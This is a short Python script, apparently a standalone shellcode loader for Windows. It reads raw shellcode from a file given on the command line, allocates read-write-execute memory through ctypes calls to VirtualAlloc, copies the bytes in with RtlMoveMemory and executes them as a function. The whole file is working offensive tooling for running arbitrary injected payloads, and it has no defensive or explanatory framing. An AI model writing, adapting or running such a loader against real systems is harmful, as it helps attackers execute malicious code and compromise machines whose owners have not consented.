import ctypes
import sys
import os

def load_and_execute_shellcode(bin_path):
    # 1. Read the shellcode binary file.
    try:
        with open(bin_path, 'rb') as f:
            shellcode = f.read()
    except Exception as e:
        print(f"[!] Failed to read file: {e}")
        return

    print(f"[*] Shellcode size: {len(shellcode)} bytes")

    # 2. Resolve kernel32.
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

    # 3. Allocate executable memory (RWX).
    VirtualAlloc = kernel32.VirtualAlloc
    VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
    VirtualAlloc.restype = ctypes.c_void_p

    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40

    ptr = VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not ptr:
        print("[!] VirtualAlloc failed")
        return
    print(f"[*] Allocation address: 0x{ptr:016X}")

    # 4. Copy the shellcode into the allocated memory.
    RtlMoveMemory = kernel32.RtlMoveMemory
    RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
    RtlMoveMemory(ptr, shellcode, len(shellcode))

    # 5. Cast the address to a callable and execute it.
    print("[*] Executing shellcode ...")
    cfunc = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    cfunc()

    # Note: if the shellcode never returns, the line below never runs.
    print("[*] Shellcode returned (if it returns at all)")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: python loader.py <shellcode.bin>")
        sys.exit(1)

    if not os.path.isfile(sys.argv[1]):
        print("[!] File does not exist")
        sys.exit(1)

    load_and_execute_shellcode(sys.argv[1])
